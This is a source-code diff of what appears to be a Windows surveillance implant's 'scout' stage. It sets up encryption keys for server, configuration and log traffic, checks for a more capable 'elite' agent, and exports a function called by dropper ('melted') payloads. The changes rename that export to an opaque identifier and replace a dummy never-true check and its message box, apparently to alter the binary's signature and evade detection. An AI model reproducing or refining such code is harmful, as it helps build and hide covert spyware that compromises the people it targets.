@@ -33,7 +33,8 @@ BOOL bSync = FALSE;
 HANDLE hScoutSharedMemory;
 
 //#pragma comment(linker, "/EXPORT:MyConf=?MyConf@@YAXXZ")
-__declspec(dllexport) PWCHAR MyConf(PULONG pSynchro) // questa viene richiamata dai meltati
+//PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
+__declspec(dllexport) PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
 {
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
@@ -56,12 +57,13 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 #ifdef _DEBUG_BINPATCH
 	MessageBox(NULL, L"_DEBUG_BINPATCH", L"_DEBUG_BINPATCH", 0);
 #endif
-	if (GetCurrentProcessId() == 4)
+	
+	if (GetCurrentThread() == 0x0)
 	{
-		MessageBox(NULL, L"I'm going to start the program", L"Warning", 0);
+		MessageBox(NULL, L"Starting", L"Wait for the program to load", 0);
 		return 0;
 	}
-
+	
 	memcpy(pServerKey, CLIENT_KEY, 32);
 	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
 	memcpy(pLogKey, ENCRYPTION_KEY, 32);
@@ -70,7 +72,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
 	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
 #endif
-
+	
 	// first check for elite presence
 	if (ExistsEliteSharedMemory())
 	{
@@ -140,7 +142,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		*uSynchro = 1;
 		ExitThread(0);
 	}
-
+	
 
 	return 0;
 }
